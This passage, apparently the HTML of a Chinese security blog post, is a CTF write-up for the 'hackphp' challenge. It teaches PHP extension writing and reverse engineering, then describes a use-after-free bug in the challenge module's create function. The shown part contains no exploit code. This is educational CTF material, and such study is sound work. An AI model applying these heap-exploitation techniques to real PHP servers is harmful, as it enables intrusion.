@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;233831 0x00前言从一题学习php模块的编写，学习WEB PWN，并演示WEB PWN中的堆UAF利用基本手法。 0x01 PHP模块的编写php模块一般使用C&#x2F;C++编写，编译后以库文件的形式进行加载，在Linux下为.so，Windows下为.dll。下面，我们来编写一个php模块的hel">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AntCTFxD3CTF_hackphp">
+<meta property="og:url" content="https://github.com/ha1vk/2021/03/11/AntCTFxD3CTF-hackphp/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;233831 0x00前言从一题学习php模块的编写，学习WEB PWN，并演示WEB PWN中的堆UAF利用基本手法。 0x01 PHP模块的编写php模块一般使用C&#x2F;C++编写，编译后以库文件的形式进行加载，在Linux下为.so，Windows下为.dll。下面，我们来编写一个php模块的hel">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t01e169d4bd5aa4d03b.jpg">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t0198d90f1291674856.jpg">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t011c64a9b710ad590d.jpg">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t0151c8f0ef04b3f52c.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t01656df9ecdf33fb1f.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t0121deea040535442a.jpg">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01189b268a3272c7ce.jpg">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t01de87c0d3247a7b79.jpg">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t012d4505e30f4d7232.jpg">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t01cee9793991bbc75f.jpg">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t013a669d46ab37e228.jpg">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t018d7d058399e2bbc7.jpg">
+<meta property="article:published_time" content="2021-03-11T04:00:55.000Z">
+<meta property="article:modified_time" content="2025-06-26T09:24:39.557Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="UAF">
+<meta property="article:tag" content="PHP PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p1.ssl.qhimg.com/t01e169d4bd5aa4d03b.jpg">
+
+<link rel="canonical" href="https://github.com/ha1vk/2021/03/11/AntCTFxD3CTF-hackphp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>AntCTFxD3CTF_hackphp | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2021/03/11/AntCTFxD3CTF-hackphp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          AntCTFxD3CTF_hackphp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-03-11 12:00:55" itemprop="dateCreated datePublished" datetime="2021-03-11T12:00:55+08:00">2021-03-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 17:24:39" itemprop="dateModified" datetime="2025-06-26T17:24:39+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/233831">https://www.anquanke.com/post/id/233831</a></p>
+<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>从一题学习php模块的编写，学习WEB PWN，并演示WEB PWN中的堆UAF利用基本手法。</p>
+<h2 id="0x01-PHP模块的编写"><a href="#0x01-PHP模块的编写" class="headerlink" title="0x01 PHP模块的编写"></a>0x01 PHP模块的编写</h2><p>php模块一般使用C&#x2F;C++编写，编译后以库文件的形式进行加载，在Linux下为.so，Windows下为.dll。下面，我们来编写一个php模块的helloword，并在php里进行调用。<br>首先下载php源码，进入php源码目录的ext目录,执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/sea/Desktop/php-src/ext# ./ext_skel.php --ext helloword</span><br><span class="line">Copying config scripts... done</span><br><span class="line">Copying sources... done</span><br><span class="line">Copying tests... done</span><br><span class="line"></span><br><span class="line">Success. The extension is now ready to be compiled. To do so, use the</span><br><span class="line">following steps:</span><br><span class="line"></span><br><span class="line">cd /path/to/php-src/helloword</span><br><span class="line">phpize</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">Don&#x27;t forget to run tests once the compilation is done:</span><br><span class="line">make test</span><br><span class="line"></span><br><span class="line">Thank you for using PHP!</span><br></pre></td></tr></table></figure>
+<h3 id="模块基本语法"><a href="#模块基本语法" class="headerlink" title="模块基本语法"></a>模块基本语法</h3><p>该程序直接为我们生成了一个模板，我们可以直接查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">/* helloword extension for PHP */</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_CONFIG_H</span><br><span class="line"># include &quot;config.h&quot;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">#include &quot;php.h&quot;</span><br><span class="line">#include &quot;ext/standard/info.h&quot;</span><br><span class="line">#include &quot;php_helloword.h&quot;</span><br><span class="line"></span><br><span class="line">/* For compatibility with older PHP versions */</span><br><span class="line">#ifndef ZEND_PARSE_PARAMETERS_NONE</span><br><span class="line">#define ZEND_PARSE_PARAMETERS_NONE() \</span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(0, 0) \</span><br><span class="line">	ZEND_PARSE_PARAMETERS_END()</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">/* &#123;&#123;&#123; void helloword_test1()</span><br><span class="line"> */</span><br><span class="line">PHP_FUNCTION(helloword_test1)</span><br><span class="line">&#123;</span><br><span class="line">	ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line"></span><br><span class="line">	php_printf(&quot;The extension %s is loaded and working!\r\n&quot;, &quot;helloword&quot;);</span><br><span class="line">&#125;</span><br><span class="line">/* &#125;&#125;&#125; */</span><br><span class="line"></span><br><span class="line">/* &#123;&#123;&#123; string helloword_test2( [ string $var ] )</span><br><span class="line"> */</span><br><span class="line">PHP_FUNCTION(helloword_test2)</span><br><span class="line">&#123;</span><br><span class="line">	char *var = &quot;World&quot;;</span><br><span class="line">	size_t var_len = sizeof(&quot;World&quot;) - 1;</span><br><span class="line">	zend_string *retval;</span><br><span class="line"></span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(0, 1)</span><br><span class="line">		Z_PARAM_OPTIONAL</span><br><span class="line">		Z_PARAM_STRING(var, var_len)</span><br><span class="line">	ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line">	retval = strpprintf(0, &quot;Hello %s&quot;, var);</span><br><span class="line"></span><br><span class="line">	RETURN_STR(retval);</span><br><span class="line">&#125;</span><br><span class="line">/* &#125;&#125;&#125;*/</span><br><span class="line"></span><br><span class="line">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span><br><span class="line"> */</span><br><span class="line">PHP_RINIT_FUNCTION(helloword)</span><br><span class="line">&#123;</span><br><span class="line">#if defined(ZTS) &amp;&amp; defined(COMPILE_DL_HELLOWORD)</span><br><span class="line">	ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">	return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">/* &#125;&#125;&#125; */</span><br><span class="line"></span><br><span class="line">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span><br><span class="line"> */</span><br><span class="line">PHP_MINFO_FUNCTION(helloword)</span><br><span class="line">&#123;</span><br><span class="line">	php_info_print_table_start();</span><br><span class="line">	php_info_print_table_header(2, &quot;helloword support&quot;, &quot;enabled&quot;);</span><br><span class="line">	php_info_print_table_end();</span><br><span class="line">&#125;</span><br><span class="line">/* &#125;&#125;&#125; */</span><br><span class="line"></span><br><span class="line">/* &#123;&#123;&#123; arginfo</span><br><span class="line"> */</span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, 0)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, 0)</span><br><span class="line">	ZEND_ARG_INFO(0, str)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line">/* &#125;&#125;&#125; */</span><br><span class="line"></span><br><span class="line">/* &#123;&#123;&#123; helloword_functions[]</span><br><span class="line"> */</span><br><span class="line">static const zend_function_entry helloword_functions[] = &#123;</span><br><span class="line">	PHP_FE(helloword_test1,		arginfo_helloword_test1)</span><br><span class="line">	PHP_FE(helloword_test2,		arginfo_helloword_test2)</span><br><span class="line">	PHP_FE_END</span><br><span class="line">&#125;;</span><br><span class="line">/* &#125;&#125;&#125; */</span><br><span class="line"></span><br><span class="line">/* &#123;&#123;&#123; helloword_module_entry</span><br><span class="line"> */</span><br><span class="line">zend_module_entry helloword_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	&quot;helloword&quot;,					/* Extension name */</span><br><span class="line">	helloword_functions,			/* zend_function_entry */</span><br><span class="line">	NULL,							/* PHP_MINIT - Module initialization */</span><br><span class="line">	NULL,							/* PHP_MSHUTDOWN - Module shutdown */</span><br><span class="line">	PHP_RINIT(helloword),			/* PHP_RINIT - Request initialization */</span><br><span class="line">	NULL,							/* PHP_RSHUTDOWN - Request shutdown */</span><br><span class="line">	PHP_MINFO(helloword),			/* PHP_MINFO - Module info */</span><br><span class="line">	PHP_HELLOWORD_VERSION,		/* Version */</span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br><span class="line">/* &#125;&#125;&#125; */</span><br><span class="line"></span><br><span class="line">#ifdef COMPILE_DL_HELLOWORD</span><br><span class="line"># ifdef ZTS</span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"># endif</span><br><span class="line">ZEND_GET_MODULE(helloword)</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
+<p>其中由<code>PHP_FUNCTION</code>宏修饰的函数代表该函数可以直接在php中进行调用，由<code>PHP_RINIT_FUNCTION</code>修饰的函数将在一个新请求到来时被调用，其描述如下</p>
+<blockquote>
+<p>当一个页面请求到来时候，PHP 会迅速开辟一个新的环境，并重新扫描自己的各个扩展，遍历执行它们各自的RINIT 方法(俗称 Request Initialization)，这时候一个扩展可能会初始化在本次请求中会使用到的变量等， 还会初始化用户端（即 PHP 脚本）中的变量之类的，内核预置了 PHP_RINIT_FUNCTION() 这个宏函数来帮我们实现这个功能</p>
+</blockquote>
+<p>由<code>PHP_MINIT_FUNCTION</code> 修饰的函数将在初始化module时运行。最终将需要在php中调用的函数指针写到一个统一的数组中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">static const zend_function_entry helloword_functions[] = &#123;</span><br><span class="line">        PHP_FE(helloword_test1,         arginfo_helloword_test1)</span><br><span class="line">        PHP_FE(helloword_test2,         arginfo_helloword_test2)</span><br><span class="line">        PHP_FE_END</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>然后由<code>zend_module_entry helloword_module_entry</code>进行注册，该结构体记录了整个模块需要提供的一些信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">zend_module_entry helloword_module_entry = &#123;</span><br><span class="line">        STANDARD_MODULE_HEADER,</span><br><span class="line">        &quot;helloword&quot;,                                    /* Extension name */</span><br><span class="line">        helloword_functions,                    /* zend_function_entry */</span><br><span class="line">        NULL,                                                   /* PHP_MINIT - Module initialization */</span><br><span class="line">        NULL,                                                   /* PHP_MSHUTDOWN - Module shutdown */</span><br><span class="line">        PHP_RINIT(helloword),                   /* PHP_RINIT - Request initialization */</span><br><span class="line">        NULL,                                                   /* PHP_RSHUTDOWN - Request shutdown */</span><br><span class="line">        PHP_MINFO(helloword),                   /* PHP_MINFO - Module info */</span><br><span class="line">        PHP_HELLOWORD_VERSION,          /* Version */</span><br><span class="line">        STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h3 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h3><p>在函数里，由<code>ZEND_PARSE_PARAMETERS_NONE()</code>修饰的代表无参数；而<code>ZEND_PARSE_PARAMETERS_START</code>规定了参数的个数，其定义如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define ZEND_PARSE_PARAMETERS_START(min_num_args, max_num_args) ZEND_PARSE_PARAMETERS_START_EX(0, min_num_args, max_num_args)</span><br></pre></td></tr></table></figure>
+<p>而<code>Z_PARAM_OPTIONAL</code>代表参数可有可无，不是必须；<code>Z_PARAM_STRING(var, var_len)</code>代表该参数是字符串对象，并且将其内容地址和长度分别赋值给var和var_len。<br>还有很多类型，如下表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">specifier	Fast ZPP API macro	args</span><br><span class="line">|	Z_PARAM_OPTIONAL</span><br><span class="line">a	Z_PARAM_ARRAY(dest)	dest - zval*</span><br><span class="line">A	Z_PARAM_ARRAY_OR_OBJECT(dest)	dest - zval*</span><br><span class="line">b	Z_PARAM_BOOL(dest)	dest - zend_bool</span><br><span class="line">C	Z_PARAM_CLASS(dest)	dest - zend_class_entry*</span><br><span class="line">d	Z_PARAM_DOUBLE(dest)	dest - double</span><br><span class="line">f	Z_PARAM_FUNC(fci, fcc)	fci - zend_fcall_info, fcc - zend_fcall_info_cache</span><br><span class="line">h	Z_PARAM_ARRAY_HT(dest)	dest - HashTable*</span><br><span class="line">H	Z_PARAM_ARRAY_OR_OBJECT_HT(dest)	dest - HashTable*</span><br><span class="line">l	Z_PARAM_LONG(dest)	dest - long</span><br><span class="line">L	Z_PARAM_STRICT_LONG(dest)	dest - long</span><br><span class="line">o	Z_PARAM_OBJECT(dest)	dest - zval*</span><br><span class="line">O	Z_PARAM_OBJECT_OF_CLASS(dest, ce)	dest - zval*</span><br><span class="line">p	Z_PARAM_PATH(dest, dest_len)	dest - char*, dest_len - int</span><br><span class="line">P	Z_PARAM_PATH_STR(dest)	dest - zend_string*</span><br><span class="line">r	Z_PARAM_RESOURCE(dest)	dest - zval*</span><br><span class="line">s	Z_PARAM_STRING(dest, dest_len)	dest - char*, dest_len - int</span><br><span class="line">S	Z_PARAM_STR(dest)	dest - zend_string*</span><br><span class="line">z	Z_PARAM_ZVAL(dest)	dest - zval*</span><br><span class="line"> 	Z_PARAM_ZVAL_DEREF(dest)	dest - zval*</span><br><span class="line">+	Z_PARAM_VARIADIC(&#x27;+&#x27;, dest, num)	dest - zval*, num int</span><br><span class="line">*	Z_PARAM_VARIADIC(&#x27;*&#x27;, dest, num)	dest - zval*, num int</span><br></pre></td></tr></table></figure>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>编译以后得到了模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/sea/Desktop/php-src/ext/helloword/modules# ls</span><br><span class="line">helloword.la  helloword.so</span><br></pre></td></tr></table></figure>
+<p>安装该模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp helloword.so /usr/local/lib/php/extensions/no-debug-non-zts-20190902</span><br></pre></td></tr></table></figure>
+<p>php.ini里添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=helloword.so</span><br></pre></td></tr></table></figure>
+<p>测试程序如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">helloword_test1();</span><br><span class="line">helloword_test2(&quot;aaa&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>运行结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/sea/Desktop/php-src/ext/helloword/modules# php 1.php</span><br><span class="line">The extension helloword is loaded and working!</span><br></pre></td></tr></table></figure>
+<p>可以看到模块成功被调用，并且在php中的调用十分方便，当成普通函数调用就可以了。</p>
+<h2 id="0x02-PHP模块逆向分析"><a href="#0x02-PHP模块逆向分析" class="headerlink" title="0x02 PHP模块逆向分析"></a>0x02 PHP模块逆向分析</h2><p>将helloword.so模块用IDA打开分析<br><img src="https://p1.ssl.qhimg.com/t01e169d4bd5aa4d03b.jpg"><br>定位到函数表，可以发现供我们在php里调用的函数有两个，且这些函数名都以<code>zif</code>开头<br><img src="https://p5.ssl.qhimg.com/t0198d90f1291674856.jpg"><br>进入<code>zif_helloword_test2</code>函数，可以看到，宏都被展开了，前面是对参数个数的判断，后面则是对变量进行赋值。<br><img src="https://p2.ssl.qhimg.com/t011c64a9b710ad590d.jpg"><br>至此，对php模块，我们已经有了大致的了解。</p>
+<h2 id="0x03-hackphp"><a href="#0x03-hackphp" class="headerlink" title="0x03 hackphp"></a>0x03 hackphp</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先用IDA分析，找到<code>zif</code>开头的函数<br><img src="https://p4.ssl.qhimg.com/t0151c8f0ef04b3f52c.png"><br>因此，在php中我们能调用该模块中的4个函数，分别为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hackphp_create</span><br><span class="line">hackphp_delete</span><br><span class="line">hackphp_edit</span><br><span class="line">hackphp_get</span><br></pre></td></tr></table></figure>
+<p>hackphp_create函数接收一个整型参数，其功能是可以调用<code>_emalloc</code>创建一个堆，这里存在一个UAF漏洞，就是当<code>0&lt;=size&lt;256或者size&gt;512</code>时不会直接<code>return</code>，会执行到<code>efree</code>将申请的堆给释放掉，然后其指针仍然保留给了<code>buf</code>全局变量。<br><img src="https://p0.ssl.qhimg.com/t01656df9ecdf33fb1f.png"></p>
+<p>hackphp_delete函数无参数，其功能是将buf指向的堆efree掉，并清空buf指针<br><img src="https://p1.ssl.qhimg.com/t0121deea040535442a.jpg"></p>
